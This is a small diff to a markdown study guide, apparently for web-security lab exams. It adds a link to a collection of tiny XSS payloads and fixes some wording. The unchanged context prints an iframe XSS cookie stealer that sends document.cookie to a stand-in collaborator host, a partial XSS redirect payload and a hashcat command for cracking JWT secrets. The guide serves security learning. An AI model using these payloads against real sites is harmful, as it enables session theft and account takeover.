@@ -293,6 +293,10 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 + [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
   
+>When input field maximum length is at least 23 character in length then use this resource for **Tiny XSS Payloads**.  
+
++ [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)  
+
 >Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS cookie stealer payload on myself.  
 
 ```JavaScript
@@ -408,7 +412,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ### OnHashChange  
 
->Below iframe uses **hash** character at end of URL to trigger the **OnHashChange** XSS cookie stealer.  
+>Below iframe uses **hash** ``` # ``` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.  
   
 ```JavaScript
 <iframe src="https://TARGET.net/#" onload="document.location='http://COLLABORATOR.com/?cookies='+document.cookie"></iframe>
@@ -1691,7 +1695,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 ## Access Control  
   
 [JSON roleid PrivEsc](#privesc-json-roleid)  
-[Original URL ](#original-url)  
+[Original URL](#original-url)  
 [Drop Select a role](#drop-select-a-role)  
 
 ### PrivEsc JSON RoleId  
